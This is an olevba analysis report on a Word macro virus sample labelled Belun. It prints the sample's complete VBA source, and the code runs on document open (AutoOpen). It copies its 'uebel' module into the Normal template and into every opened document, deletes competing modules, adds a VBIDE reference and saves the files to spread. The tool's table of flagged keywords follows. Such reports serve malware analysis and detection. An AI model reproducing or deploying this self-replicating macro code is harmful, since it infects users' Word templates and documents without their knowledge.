olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Belun-4b5589005b6c4338f3ba9e33df1b5e04207e7b36
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Belun-4b5589005b6c4338f3ba9e33df1b5e04207e7b36 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO uebel.bas 
in file: Virus.MSWord.Belun-4b5589005b6c4338f3ba9e33df1b5e04207e7b36 - OLE stream: 'Macros/VBA/uebel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    IstMirSchlecht
End Sub
Sub IstMirSchlecht()
'On Error Resume Next
Set Norm = NormalTemplate.VBProject.VBComponents
Set Acti = ActiveDocument.VBProject.VBComponents
Const ActiveModulName = "uebel"

For i = 1 To Norm.Count
    If Norm(i).Name = ActiveModulName Then NormIns = True
    If Norm(i).Name = "Modul1" And NormIns = False Then KillSomeNormModul = True
Next

For i = 1 To Acti.Count
    If Acti(i).Name = ActiveModulName Then ActIns = True
    If Acti(i).Name = "Modul1" And ActIns = False Then KillSomeActModul = True
Next

If KillSomeNormModul = True Then
    Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If KillSomeActModul = True Then
    Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Modul1", Object:=wdOrganizerObjectProjectItems
End If

If NormIns = False Then
    CheckRefNormal
    Norm.Add (vbext_ct_StdModule)
    Norm("Modul1").Name = ActiveModulName
    ActiveLines = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    ActContent = ActiveDocument.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, ActiveLines)
    Norm(ActiveModulName).CodeModule.AddFromString (ActContent)
    NormalTemplate.Save
End If
    
If ActIns = False Then
    CheckRefActive
    Acti.Add (vbext_ct_StdModule)
    Acti("Modul1").Name = ActiveModulName
    NormLines = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.CountOfLines
    NormContent = NormalTemplate.VBProject.VBComponents(ActiveModulName).CodeModule.Lines(1, NormLines)
    Acti(ActiveModulName).CodeModule.AddFromString (NormContent)
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Function CheckRefNormal()
CheckRefNormal = False

For i = 1 To NormalTemplate.VBProject.References.Count
    If NormalTemplate.VBProject.References(i).Name = "VBIDE" Then CheckRefNormal = True
Next

If CheckRefNormal = False Then
    NormalTemplate.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function

Function CheckRefActive()
CheckRefActive = False

For i = 1 To ActiveDocument.VBProject.References.Count
    If ActiveDocument.VBProject.References(i).Name = "VBIDE" Then CheckRefActive = True
Next

If CheckRefActive = False Then
    ActiveDocument.VBProject.References.AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0
End If

End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

